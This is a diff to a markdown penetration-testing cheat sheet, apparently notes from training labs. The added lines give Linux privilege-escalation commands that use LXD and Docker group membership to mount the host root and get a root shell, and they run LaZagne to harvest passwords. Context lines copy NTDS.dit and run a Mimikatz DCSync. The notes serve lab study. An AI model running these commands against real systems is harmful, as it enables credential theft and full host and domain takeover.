@@ -577,6 +577,9 @@ move sam.save \\<ip>\NameofFileShare
 
 # Uses Windows command line based tool copy to create a copy of NTDS.dit for a volume shadow copy of C:.
 cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
+
+# LaZagne for quick find of passwords 
+start LaZagne.exe all 
 ```
 ##### Linux Password Attacks
 ```
@@ -645,6 +648,33 @@ find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"
 
 #Enumerating Capabilities
 find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
+
+#Screen -v Screen version 4.05.00 (GNU) 10-Dec-16, suffers from a privilege escalation vulnerability due to a lack of a permissions check when opening a log file.
+https://www.exploit-db.com/exploits/41154
+
+#Find Cronjobs, interesting files or directories
+find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
+pspy32 or 64 to check for interesting running jobs, such as cronjobs
+
+#Check if there are any containers LXD or part of group
+id = 116(lxd) 
+lxc image import ubuntu-template.tar.xz --alias ubuntutemp
+lxc init ubuntutemp privesc -c security.privileged=true
+lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
+lxc start privesc
+lxc exec privesc /bin/bash
+
+#Docker
+id = 118(docker)
+docker image ls
+#example
+docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
+#alternative:
+docker run -v /:/mnt --rm -it ubuntu chroot /mnt sh
+
+#logrotate, need write access to log files, logrotate must run as root or privileged, and be on version 3.86, 3.11, 3.15.0, 3.18.0
+
+#LD_Preload Priv Esc; Needs sudo priv on file: example apache2, (root) NOPASSWD: /usr/sbin/apache2 restart
 
 ```
 
@@ -1260,7 +1290,6 @@ ect samaccountname,objectsid,memberof,useraccountcontrol |fl
 # Uses Mimikatz to perform a dcsync attack from a Windows-based host.
 mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
 
-
 # Uses the PowerShell cmd-let Enter-PSSession to establish a PowerShell session with a target over the network (-ComputerName ACADEMY-EA-DB01) from a Windows-based host. Authenticates using credentials made in the 2 commands shown prior ($cred & $password).
 Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred
 
@@ -1287,6 +1316,7 @@ Get-DomainUser * | Select-Object samaccountname,description
 
 # PowerView tool used to check for the PASSWD_NOTREQD setting of select objects (Select-Object) on a target Windows domain from a Windows-based host.
 Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
+
 ```
 ##### ASREPRoasting
 ```
